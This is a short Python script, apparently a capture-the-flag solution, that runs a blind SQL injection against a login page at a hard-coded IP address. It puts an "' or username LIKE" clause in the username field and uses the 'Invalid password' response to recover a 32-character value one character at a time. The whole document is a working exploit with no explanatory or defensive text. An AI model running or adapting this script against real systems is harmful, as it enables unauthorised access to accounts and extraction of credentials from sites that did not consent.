import requests
import re

alphabet="abcdefghijklmnopqrstuvxywzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

url= "http://35.190.155.168/44c8933501/login"

pass_sure=""

for x in range(0,32):
    print("cicle: "+str(x))
    for letter in alphabet:
        newpass = pass_sure+letter
        data= {
                "username": "' or username LIKE '{}%".format(newpass),
                "password": 'temp'
                }
        page = requests.post(url,data=data)
        #print(page.text)
        # if user exists -> update username and exit
        if re.search("Invalid password",page.text):
            pass_sure=newpass
            print("MATCH: "+pass_sure)
            break

print("Password is: "+pass_sure)
